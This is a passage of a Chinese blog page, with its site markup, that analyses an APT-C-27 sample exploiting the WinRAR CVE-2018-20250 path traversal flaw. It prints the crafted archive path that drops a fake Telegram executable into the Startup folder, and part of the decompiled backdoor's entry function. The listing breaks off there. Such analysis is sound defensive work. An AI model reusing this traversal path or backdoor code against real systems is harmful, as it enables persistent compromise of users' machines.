27.12 25.76 26.8 25.76 Z M 33.2 9.84 Q 32.28 9.84 32.28 9.16 Q 32.28 8.68 32.8 8.12 Q 33.32 7.56 34.32 7.32 Q 34.92 7.16 35.3 7.14 Q 35.68 7.12 36.04 7 Q 35.88 7.76 35.38 8.64 Q 34.88 9.52 34.08 9.72 Q 33.68 9.84 33.2 9.84 Z" data-astro-cid-cagdmauf></path> </g> </svg> </div> </a>  <nav class="flex items-center gap-4.8 w-full lt-md:justify-end
    justify-end" aria-label="Main menu">  <div class="grid grid-flow-col items-center gap-4.8 print:op-0
              false
              "> <a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/nicky.cool/blog/" title="Blog" aria-label="Blog" aria-current="false">  <span>Blog</span></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/nicky.cool/projects/" title="Projects" aria-label="Projects" aria-current="false">  <span>Projects</span></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/nicky.cool/shorts/" title="Shorts" aria-label="Shorts" aria-current="false">  <div class="i-meteor-icons-grid"></div></a><hr class="w-0.25 h-[85%] b-t-0 bg-[#ddd] dark:bg-[#333] lt-md:hidden" aria-hidden="true"><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="https://github.com/nickyl07" title="Github" aria-label="Github" rel="me">  <div class="i-uil-github-alt"></div></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="https://x.com/noknoku07_nok" title="Twitter" aria-label="Twitter" rel="me">  <div class="i-ri-twitter-x-fill"></div></a><hr class="w-0.25 h-[85%] b-t-0 bg-[#ddd] dark:bg-[#333] lt-md:hidden" aria-hidden="true"><!-- Search Switch --><button type="button" id="search-switch" class="op-60 hover:op-100 op-transition" title="Search" aria-label="Search"> <div u-i-grommet-icons-search></div> </button> <!-- Search Panel --> <search-panel role="dialog" id="search-panel" class="hidden z-200 fixed top-15% lt-lgp:top-10% left-50% translate-x--50%
    grid grid-rows-[auto_1fr_auto]
    w-42rem lt-lgp:w-90% max-h-70vh lt-lgp:max-h-80vh p-3 lt-lgp:pb-1 rounded-lg
    text-[var(--c-text)] bg-[var(--c-bg)] shadow-custom_0_0_10_0" aria-modal="true" aria-labelledby="search-label" aria-keyshortcuts="ArrowUp,ArrowDown,Enter,Esc" data-filter="true" data-batch-size="5" data-max-items="3"> <div class="flex flex-col gap-2"> <!-- Tab list --> <div role="tablist" class="search-tabs flex gap-2 justify-start items-center text-xs" aria-label="Search categories"> <button type="button" role="tab" class="px-1.5 py-0.5 rounded
                bg-[#88888816]! dark:bg-[#88888823]!
                aria-[selected=false]:op-40 aria-[selected=true]:op-100
                aria-[selected=false]:hover:op-70 op-transition cursor-pointer" data-type="blog"> Blog </button><button type="button" role="tab" class="px-1.5 py-0.5 rounded
                bg-[#88888816]! dark:bg-[#88888823]!
                aria-[selected=false]:op-40 aria-[selected=true]:op-100
                aria-[selected=false]:hover:op-70 op-transition cursor-pointer" data-type="projects"> Projects </button> </div> <!-- Search Bar --> <div class="grid grid-cols-[auto_1fr] items-center
        h-10 px-3 rounded-md
        bg-[#88888811] dark:bg-[#88888818]"> <div u-i-grommet-icons-search></div> <label for="search-input" id="search-label" class="sr-only"></label> <input type="search" role="combobox" id="search-input" class="h-full pl-2 bg-transparent outline-0" autocomplete="off" autocorrect="off" spellcheck="false" aria-labelledby="search-label" aria-autocomplete="list" aria-controls="search-results" aria-expanded="false"> </div> </div> <!-- Search Results --> <div role="listbox" id="search-results" class="overflow-y-auto my-1" aria-labelledby="search-input" tabindex="-1" data-base="/nicky.cool/"> <!-- Results --> <div id="search-content"></div> <!-- Feedback --> <div id="search-feedback" class="hidden py-3 text-center text-sm op-40"></div> <!-- Pagination --> <div id="search-pagination" style="display: none" class="items-center justify-center gap-4 pt-4 pb-3 text-xs"> <button class="flex items-center justify-center gap-1 op-40 hover:op-100 op-transition" data-action="more"> <div u-i-material-symbols-arrow-cool-down></div> <span></span> </button> <button class="flex items-center justify-center gap-1 op-40 hover:op-100 op-transition" data-action="all"> <div u-i-material-symbols-expand-all></div> <span></span> </button> </div> </div> <!-- Shortcuts Footer --> <footer role="note" aria-label="Keyboard shortcuts"> <ul class="flex flex-wrap items-center gap-4.5 lt-md:hidden
        pt-3 border-t border-[#7d7d7d4d]
        text-xs op-40 select-none"> <li class="flex items-center gap-1"> <kbd class="search-kbd-key"> <div u-i-material-symbols-arrow-upward></div> </kbd> <kbd class="search-kbd-key"> <div u-i-material-symbols-arrow-downward></div> </kbd> <span>Navigate</span> </li> <li class="flex items-center gap-1"> <kbd class="search-kbd-key"> <div u-i-grommet-icons-return></div> </kbd> <span>Go to Page</span> </li> <li class="flex items-center gap-1"> <kbd class="search-kbd-key">esc</kbd> <span>Close</span> </li> </ul> </footer> </search-panel> <script type="module" src="/nicky.cool/_astro/SearchSwitch.astro_astro_type_script_index_0_lang.ByiBzNYd.js"></script> <script type="module" src="/nicky.cool/_astro/SearchSwitch.astro_astro_type_script_index_1_lang.YoRIvrBK.js"></script> <!-- https://github.com/pagefind/pagefind/blob/production-docs/pagefind_web_js/types/index.d.ts --> <script>(function(){const scriptUrl = "/nicky.cool/pagefind/pagefind.js";
const navHighlight = true;

    async function loadPagefind() {
      const pagefind = await import(scriptUrl)

      // https://pagefind.app/docs/search-config/
      await pagefind.options({
        'excerptLength': 20,
        ...(navHighlight && {
          'highlightParam': 'search'
        }),

        // https://pagefind.app/docs/ranking/
        ranking: {
          termFrequency: 0.6,
          termSimilarity: 1.0,
          pageLength: 0.0,
          termSaturation: 1.4
        }
      })

      pagefind.init()
      window.pagefind = pagefind
    }

    if (!window.pagefind) loadPagefind()
  })();</script> <script>(function(){const scriptUrl = "/nicky.cool/pagefind/pagefind-highlight.js";

    async function loadPagefindHighlight() {
      await import(scriptUrl)

      const PagefindHighlight = window.PagefindHighlight
      if (!PagefindHighlight) return
      const pagefindHighlight = new PagefindHighlight({
        // https://pagefind.app/docs/highlight-config
        highlightParam: "search",
        markContext: "[data-pagefind-body]",
        markOptions: {
          // https://markjs.io/#mark
          className: "pagefind-highlight",
          exclude: ["[data-pagefind-ignore]", "[data-pagefind-ignore] *"],
        },
        addStyles: false,
      });

      window.pagefindHighlight = pagefindHighlight
    }

    if (!window.pagefindHighlight) loadPagefindHighlight()
  })();</script> <script type="module">document.addEventListener("astro:page-load",()=>{new URLSearchParams(location.search).has("search")&&pagefindHighlight.highlight()});</script><button id="theme-switch" class="op-60 hover:op-100 op-transition" title="Toggles light & dark" aria-label="Toggles light & dark"> <div u-i-ri-sun-line u-dark:i-ri-moon-line></div> </button> <!-- Initialize as inline scripts for faster response, avoiding FOUC  --> <script data-astro-rerun>
  function initTheme() {
    let theme
    if (typeof localStorage !== 'undefined' && localStorage.getItem('theme')) {
      theme = localStorage.theme
    } else {
      theme = window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
      window.localStorage.setItem('theme', theme)
    }

    const toggleThemeButton = document.getElementById('theme-switch')
    toggleThemeButton.setAttribute('role', 'switch')

    if (theme === 'light') {
      document.documentElement.classList.remove('dark')
      toggleThemeButton.setAttribute('aria-label', 'light')
      toggleThemeButton.setAttribute('aria-checked', 'false')
    } else {
      document.documentElement.classList.add('dark')
      toggleThemeButton.setAttribute('aria-label', 'dark')
      toggleThemeButton.setAttribute('aria-checked', 'true')
    }

    const colorThemeMetaTag = document.querySelector("meta[name='theme-color']")
    const bgColor = getComputedStyle(document.body).getPropertyValue('--c-bg')
    colorThemeMetaTag?.setAttribute('content', bgColor)
  }

  initTheme()
</script> <script type="module">const p=()=>{const e=navigator.userAgentData;return e?.brands?.length&&e.brands.some(d=>/Chrom(e|ium)/i.test(d.brand))?"both":"none"},f=p();document.addEventListener("astro:page-load",()=>{let e;const c=t=>{const n=t?`${location.origin}/giscus/dark.css`:`${location.origin}/giscus/light.css`,o=document.getElementById("giscus-script");if(o){o.setAttribute("data-theme",n);const s=document.querySelector("iframe.giscus-frame");s&&s instanceof HTMLIFrameElement&&s.contentWindow&&s.contentWindow.postMessage({giscus:{setConfig:{theme:n}}},"https://giscus.app")}},r=t=>{t.setAttribute("aria-label",e?"dark":"light"),t.setAttribute("aria-checked",e?"true":"false")},d=()=>{const t=document.querySelector("meta[name='theme-color']"),n=getComputedStyle(document.body).getPropertyValue("--c-bg");t?.setAttribute("content",n)},u=()=>{window.localStorage.setItem("theme",e?"dark":"light")},g=t=>{const n=t.currentTarget,o=()=>{document.documentElement.classList.toggle("dark"),e=document.documentElement.classList.contains("dark"),c(e),r(n),d(),u()};if(!(document.startViewTransition&&!window.matchMedia("(prefers-reduced-motion: reduce)").matches)){o();return}const i=t.clientX,a=t.clientY,h=Math.hypot(Math.max(i,innerWidth-i),Math.max(a,innerHeight-a));document.startViewTransition(()=>o()).ready.then(()=>{const l=[`circle(0px at ${i}px ${a}px)`,`circle(${h}px at ${i}px ${a}px)`];document.documentElement.animate({clipPath:e?l.reverse():l},{duration:400,easing:"ease-out",fill:f,pseudoElement:e?"::view-transition-old(root)":"::view-transition-new(root)"})})},m=document.getElementById("theme-switch");m?.addEventListener("click",g),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:t})=>{e=t,document.documentElement.classList.toggle("dark",e),c(e),m&&r(m),u()})});</script><a class="op-60 no-underline hover:op-100 op-transition lt-md:hidden" href="/nicky.cool/rss.xml" title="RSS Feed" aria-label="RSS Feed">   <div u-i-lucide-rss></div> </a> </div> <button id="nav-open-button" class="hidden lt-md:block op-60 hover:op-100 op-transition" title="Navigation" aria-label="Navigation" aria-expanded="false" aria-controls="nav-panel"> <div u-i-ri-menu-line></div> </button> <div id="nav-panel" class="hidden! z-200 fixed top-10% left-50% translate-x--50%
    overflow-y-auto flex flex-col gap-5
    w-90% max-h-80vh py-4 px-6 rounded-lg
  bg-[var(--c-bg)] shadow-custom_0_0_10_0 text-[var(--c-text)]"> <ul> <li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/nicky.cool/blog/" title="Blog" aria-label="Blog" aria-current="false">  <span>Blog</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/nicky.cool/projects/" title="Projects" aria-label="Projects" aria-current="false">  <span>Projects</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/nicky.cool/shorts/" title="Shorts" aria-label="Shorts" aria-current="false">  <span>Shorts</span></a></li> </ul> <div class="flex justify-center items-center gap-4"> <a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="https://github.com/nickyl07" title="Github" aria-label="Github" rel="me">  <div class="i-uil-github-alt"></div></a><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="https://x.com/noknoku07_nok" title="Twitter" aria-label="Twitter" rel="me">  <div class="i-ri-twitter-x-fill"></div></a><a class="op-60 no-underline hover:op-100 op-transition op-50!" href="/nicky.cool/rss.xml" title="RSS Feed" aria-label="RSS Feed">   <div u-i-lucide-rss></div> </a>  </div> </div> <script type="module" src="/nicky.cool/_astro/NavSwitch.astro_astro_type_script_index_0_lang.lh05xrMp.js"></script> </nav> </header> <!-- Main --> <main id="main" class="px-7 py-10"> <!-- Content -->  <header class="prose mx-auto mb-8"> <h1>CVE-2018-20250 WinRAR 漏洞利用样本分析</h1>   <div class="mt--6! op-50"><time datetime="2024-10-11T00:00:00.000Z">2024年10月11日</time><span> · 35 min</span></div>  </header> <article class="slide-enter-content prose mx-auto" data-pagefind-body data-pagefind-filter="collection:blog"> <script type="module" src="/nicky.cool/_astro/TocButton.astro_astro_type_script_index_0_lang.CJR-4Jo8.js"></script><script type="module">class h extends HTMLElement{#n;#s;#i=null;#t=new Map;#o=null;#e=[];connectedCallback(){this.#c(()=>this.#l())}disconnectedCallback(){this.#f()}#l=()=>{this.#n=this.#h(this.dataset.minH),this.#s=this.#h(this.dataset.maxH);const t=this.#r("a",!1);this.#d(t);const e=this.#n&&this.#s?this.#r(this.#u(this.#n,this.#s)):this.#r(".toc-heading");this.#i=new IntersectionObserver(this.#a,{root:null,rootMargin:"0% 0% -75% 0%",threshold:0});for(const n of e)this.#i.observe(n)};#c=t=>(window.requestIdleCallback||(e=>setTimeout(e,1)))(t);#a=t=>{if(!t.length)return;let e=t[0];for(let o=1;o<t.length;o++)t[o].time>e.time&&(e=t[o]);const n=e.target;if(!n)return;const i=e.boundingClientRect.top>window.innerHeight/4?this.#g(this.#t,n):n;if(!i||i===this.#o)return;const r=this.#t.get(i)??[];if(this.#e&&this.#e.length)for(const o of this.#e)o.removeAttribute("aria-current");for(const o of r)o.setAttribute("aria-current","true"),o.scrollIntoView({behavior:"smooth",block:"center"});this.#o=i,this.#e=r};#h=t=>t?parseInt(t,10):void 0;#r=(t,e=!0)=>e?Array.from(document.querySelectorAll(t)):Array.from(this.querySelectorAll(t));#d=t=>{for(const e of t){const{hash:n}=new URL(e.href),s=decodeURIComponent(n.replace(/^#/,"")),i=document.getElementById(s);i&&(this.#t.has(i)?this.#t.get(i)?.push(e):this.#t.set(i,[e]))}};#u=(t,e,n="")=>{const s=[];for(let i=t;i<=e;i++)n?s.push(`${n} h${i}`):s.push(`h${i}`);return s.join(", ")};#g=(t,e)=>{let n=null;for(const s of t.keys()){if(s===e)return n;n=s}return null};#f=()=>{this.#i?.disconnect(),this.#i=null,this.#t.clear(),this.#o=null,this.#e=[]}}customElements.define("table-of-contents",h);</script><aside> <table-of-contents data-min-h="2" data-max-h="4"> <!-- Greater than or equal to 1128px --> <nav class="toc-desktop toc-desktop-content"> <div class="toc-desktop-anchor i-ri-menu-2-fill"></div> <ul> <li><a class="op-60 no-underline hover:op-100" href="#前言exploit-与普通病毒的区别" aria-label="Scroll to 前言：Exploit 与普通病毒的区别">  前言：Exploit 与普通病毒的区别</a></li><li><a class="op-60 no-underline hover:op-100" href="#样本概览" aria-label="Scroll to 样本概览">  样本概览</a></li><li><a class="op-60 no-underline hover:op-100" href="#第一阶段特洛伊木马的容器" aria-label="Scroll to 第一阶段：特洛伊木马的容器">  第一阶段：特洛伊木马的容器</a></li><li><a class="op-60 no-underline hover:op-100" href="#第二阶段突破边界与精准投递" aria-label="Scroll to 第二阶段：突破边界与精准投递">  第二阶段：突破边界与精准投递</a><ul><li><a class="op-60 no-underline hover:op-100" href="#路径穿越原理" aria-label="Scroll to 路径穿越原理">  路径穿越原理</a></li><li><a class="op-60 no-underline hover:op-100" href="#漏洞成因" aria-label="Scroll to 漏洞成因">  漏洞成因</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#第三阶段触发与核心调度" aria-label="Scroll to 第三阶段：触发与核心调度">  第三阶段：触发与核心调度</a><ul><li><a class="op-60 no-underline hover:op-100" href="#高仿伪装" aria-label="Scroll to 高仿伪装">  高仿伪装</a></li><li><a class="op-60 no-underline hover:op-100" href="#核心中枢ko-函数分析" aria-label="Scroll to 核心中枢：ko() 函数分析">  核心中枢：ko() 函数分析</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#第四阶段后门模块展开-payload" aria-label="Scroll to 第四阶段：后门模块展开 (Payload)">  第四阶段：后门模块展开 (Payload)</a><ul><li><a class="op-60 no-underline hover:op-100" href="#1-持久化与隐藏ins-函数" aria-label="Scroll to 1. 持久化与隐藏：INS() 函数">  1. 持久化与隐藏：INS() 函数</a></li><li><a class="op-60 no-underline hover:op-100" href="#2-远程控制核心rc-与-ind" aria-label="Scroll to 2. 远程控制核心：RC() 与 Ind()">  2. 远程控制核心：RC() 与 Ind()</a></li><li><a class="op-60 no-underline hover:op-100" href="#3-间谍行为wrk-与-inf" aria-label="Scroll to 3. 间谍行为：WRK() 与 Inf()">  3. 间谍行为：WRK() 与 Inf()</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#总结" aria-label="Scroll to 总结">  总结</a></li>  </ul> </nav> <!-- less than 1128px --> <button id="toc-open-button" class="z-50 fixed right-5 bottom-18
    w-10 h-10 rounded-full
    op-0 bg-#8883 dark:bg-#8886 pointer-events-none op-transition
    lt-lgp:op-50 lt-lgp:pointer-events-auto
    hover:op-100 print:hidden" title="Open table of contents"> <div u-i-lucide-table-of-contents class="text-gray-700 dark:text-gray-200"></div> </button> <nav id="toc-panel" class="hidden! z-200 fixed top-10% left-50% translate-x--50%
    overflow-y-auto flex flex-col
    w-90% max-h-80vh py-4 px-6 rounded-lg
    bg-[var(--c-bg)] shadow-custom_0_0_10_0 text-[var(--c-text)]"> <div class="pb-1 b-b b-[var(--c-text)]">Table of Contents</div> <ul class="text-sm"> <li><a class="op-60 no-underline hover:op-100" href="#前言exploit-与普通病毒的区别" aria-label="Scroll to 前言：Exploit 与普通病毒的区别">  前言：Exploit 与普通病毒的区别</a></li><li><a class="op-60 no-underline hover:op-100" href="#样本概览" aria-label="Scroll to 样本概览">  样本概览</a></li><li><a class="op-60 no-underline hover:op-100" href="#第一阶段特洛伊木马的容器" aria-label="Scroll to 第一阶段：特洛伊木马的容器">  第一阶段：特洛伊木马的容器</a></li><li><a class="op-60 no-underline hover:op-100" href="#第二阶段突破边界与精准投递" aria-label="Scroll to 第二阶段：突破边界与精准投递">  第二阶段：突破边界与精准投递</a><ul><li><a class="op-60 no-underline hover:op-100" href="#路径穿越原理" aria-label="Scroll to 路径穿越原理">  路径穿越原理</a></li><li><a class="op-60 no-underline hover:op-100" href="#漏洞成因" aria-label="Scroll to 漏洞成因">  漏洞成因</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#第三阶段触发与核心调度" aria-label="Scroll to 第三阶段：触发与核心调度">  第三阶段：触发与核心调度</a><ul><li><a class="op-60 no-underline hover:op-100" href="#高仿伪装" aria-label="Scroll to 高仿伪装">  高仿伪装</a></li><li><a class="op-60 no-underline hover:op-100" href="#核心中枢ko-函数分析" aria-label="Scroll to 核心中枢：ko() 函数分析">  核心中枢：ko() 函数分析</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#第四阶段后门模块展开-payload" aria-label="Scroll to 第四阶段：后门模块展开 (Payload)">  第四阶段：后门模块展开 (Payload)</a><ul><li><a class="op-60 no-underline hover:op-100" href="#1-持久化与隐藏ins-函数" aria-label="Scroll to 1. 持久化与隐藏：INS() 函数">  1. 持久化与隐藏：INS() 函数</a></li><li><a class="op-60 no-underline hover:op-100" href="#2-远程控制核心rc-与-ind" aria-label="Scroll to 2. 远程控制核心：RC() 与 Ind()">  2. 远程控制核心：RC() 与 Ind()</a></li><li><a class="op-60 no-underline hover:op-100" href="#3-间谍行为wrk-与-inf" aria-label="Scroll to 3. 间谍行为：WRK() 与 Inf()">  3. 间谍行为：WRK() 与 Inf()</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#总结" aria-label="Scroll to 总结">  总结</a></li> </ul> </nav>  </table-of-contents> </aside> <h2 id="前言exploit-与普通病毒的区别">前言：Exploit 与普通病毒的区别<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 前言：Exploit 与普通病毒的区别" data-pagefind-ignore="" href="#前言exploit-与普通病毒的区别">#</a></h2>
<p>在分析样本之前，我们需要厘清“漏洞利用（Exploit）”与普通恶意软件的界限。</p>
<p>普通病毒通常依赖“社会工程学”——诱骗用户双击一个 <code>.exe</code> 文件。如果用户不点，病毒就无法运行。而 <strong>Exploit（漏洞利用）</strong> 则更加危险且隐蔽。它利用合法软件（如 WinRAR, Word, Chrome）自身的代码缺陷（漏洞）。你并没有运行任何可疑程序，只是像往常一样打开了一个文档或解压了一个压缩包。但因为处理这个文件的软件（如 WinRAR）本身存在逻辑缺陷（漏洞），就在你点击解压的那一瞬间，攻击代码就已经在后台悄无声息地执行了。</p>
<p>本文将分析著名的 <strong>APT-C-27（黄金鼠）</strong> 组织使用的攻击样本。它利用了 WinRAR 中一个沉睡了 19 年的陈旧代码库（UNACEV2.DLL），利用<strong>CVE-2018-20250</strong> 漏洞将木马植入受害者电脑的典型案例。</p>
<h2 id="样本概览">样本概览<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 样本概览" data-pagefind-ignore="" href="#样本概览">#</a></h2>
<p>MD5: 314E8105F28530EB0BF54891B9B3FF69</p>
<p>SHA1: 8C9B88EE829B880E4AF8B7CD7DCCCC16FAA2E413</p>
<h2 id="第一阶段特洛伊木马的容器">第一阶段：特洛伊木马的容器<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第一阶段：特洛伊木马的容器" data-pagefind-ignore="" href="#第一阶段特洛伊木马的容器">#</a></h2>
<p><strong>核心机制：恶意构造的 ACE 压缩包</strong></p>
<p>样本表面上看起来是一个无害的压缩包（可能伪装成图片包或文档包），用户习惯性地使用 WinRAR 进行解压。</p>
<p><img alt="image-20241009181114699" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 591px) 591px, 100vw"  data-astro-image="constrained" width="591" height="447" src="/nicky.cool/_astro/20260221221507711_4z0lj.webp" srcset="/nicky.cool/_astro/20260221221507711_4z0lj.webp 591w"></p>
<ul>
<li><strong>文件类型</strong>: ACE Archive (伪装成 RAR 扩展名)</li>
<li><strong>利用漏洞</strong>: CVE-2018-20250 (WinRAR UNACEV2.DLL 路径穿越漏洞)</li>
<li><strong>触发条件</strong>: 用户执行“解压到当前文件夹”或类似操作。</li>
</ul>
<blockquote><p>正常情况下，你把一个文件解压到桌面，它就应该在桌面。但这个压缩包被黑客修改过，它告诉 WinRAR：“请把我解压到桌面的同时，顺便把这个文件悄悄放到系统的‘启动’文件夹里去。” 由于 WinRAR 存在漏洞，它没有检查这个路径是否越界，直接照做了。</p></blockquote>
<p><img alt="image-20260117230104946" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 288px) 288px, 100vw"  data-astro-image="constrained" width="288" height="124" src="/nicky.cool/_astro/20260221221520149_2tNekG.webp" srcset="/nicky.cool/_astro/20260221221520149_2tNekG.webp 288w"></p>
<h2 id="第二阶段突破边界与精准投递">第二阶段：突破边界与精准投递<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第二阶段：突破边界与精准投递" data-pagefind-ignore="" href="#第二阶段突破边界与精准投递">#</a></h2>
<p><strong>核心行为：目录穿越</strong></p>
<p>这是本样本作为 Exploit 最精彩的部分。攻击者并没有通过编写复杂的 Shellcode 来溢出内存，而是利用了<strong>逻辑漏洞</strong>。</p>
<h3 id="路径穿越原理">路径穿越原理<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 路径穿越原理" data-pagefind-ignore="" href="#路径穿越原理">#</a></h3>
<p>在正常的压缩包中，文件名是 <code>1.docx</code>。 但在恶意构造的 ACE 包中，文件名被修改为：<code>C:\C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Telegram Desktop.exe</code></p>
<p><img alt="image-20260118220134329" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 537px) 537px, 100vw"  data-astro-image="constrained" width="537" height="124" src="/nicky.cool/_astro/20260221221523933_1VCXeO.webp" srcset="/nicky.cool/_astro/20260221221523933_1VCXeO.webp 537w"></p>
<h3 id="漏洞成因">漏洞成因<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 漏洞成因" data-pagefind-ignore="" href="#漏洞成因">#</a></h3>
<p>WinRAR 在调用旧版的 <code>UNACEV2.DLL</code> 处理 ACE 格式时，没有对解压路径中的 <code>..\</code> 或绝对路径进行过滤。</p>
<ul>
<li><strong>预期行为</strong>：解压到 <code>C:\Users\Admin\Desktop\Extracted\</code></li>
<li><strong>实际行为</strong>：WinRAR 忽略了目标文件夹，直接按照压缩包内指定的绝对路径，将恶意文件 <code>Telegram Desktop.exe</code> 写入到了 Windows 的 <strong>启动目录</strong>。</li>
</ul>
<p>此时，用户在解压目录下可能只看到了一张无关紧要的图片（作为掩护），殊不知致命的木马已经绕过防御，部署到了开机自启位置。</p>
<p><img alt="image-20241009181556546" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 771px) 771px, 100vw"  data-astro-image="constrained" width="771" height="638" src="/nicky.cool/_astro/20260221221526558_ZHNLnb.webp" srcset="/nicky.cool/_astro/20260221221526558_Z2j0m1P.webp 640w, /nicky.cool/_astro/20260221221526558_Z1uDpNW.webp 750w, /nicky.cool/_astro/20260221221526558_ZHNLnb.webp 771w"></p>
<h2 id="第三阶段触发与核心调度">第三阶段：触发与核心调度<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第三阶段：触发与核心调度" data-pagefind-ignore="" href="#第三阶段触发与核心调度">#</a></h2>
<p><strong>核心策略：重启即中招 + 高仿伪装</strong></p>
<p>当受害者重启计算机时，位于启动目录的 <code>Telegram Desktop.exe</code> 被执行。此时，控制权交给了恶意代码的入口函数。</p>
<p><img alt="mermaid-diagram" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1245px) 1245px, 100vw"  data-astro-image="constrained" width="1245" height="884" src="/nicky.cool/_astro/20260221221529115_1L4Dgi.webp" srcset="/nicky.cool/_astro/20260221221529115_Z2c9ePS.webp 640w, /nicky.cool/_astro/20260221221529115_Z28PorE.webp 750w, /nicky.cool/_astro/20260221221529115_Z2rV5ST.webp 828w, /nicky.cool/_astro/20260221221529115_1LuA0Q.webp 1080w, /nicky.cool/_astro/20260221221529115_1L4Dgi.webp 1245w"></p>
<h3 id="高仿伪装">高仿伪装<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 高仿伪装" data-pagefind-ignore="" href="#高仿伪装">#</a></h3>
<p>样本采用了极具欺骗性的伪装策略。</p>
<ul>
<li><strong>伪装对象</strong>: <code>Telegram Desktop.exe</code> (流行的即时通讯软件)。</li>
<li><strong>心理战术</strong>: 相比于伪装成陌生的系统服务，伪装成常用软件更能降低用户的警惕。当用户在启动项中看到 “Telegram Desktop” 时，往往会认为是自己安装的软件在自启动。</li>
</ul>
<h3 id="核心中枢ko-函数分析">核心中枢：ko() 函数分析<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 核心中枢：ko() 函数分析" data-pagefind-ignore="" href="#核心中枢ko-函数分析">#</a></h3>
<p><code>ko()</code> 是该后门样本的主入口函数，它扮演着“指挥官”的角色，负责初始化环境、启动功能模块并维护自身运行。</p>
<div class="expressive-code"><link rel="stylesheet" href="/nicky.cool/_astro/ec.p1vpi.css"><script type="module" src="/nicky.cool/_astro/ec.p1z7b.js"></script><figure class="frame" style="--lnWidth:3ch"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">public</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">static</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">void</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ko</span><span style="--0:#666666;--1:#999999">()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第一步：命令行参数检测+注册表标记 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Interaction</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Command</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 检测是否有命令行启动参数（如静默启动/更新）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 写入注册表标记"di"="!"：标记程序通过命令行启动，用于后续逻辑判断</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">CurrentUser</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">SetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">di</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">!</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span 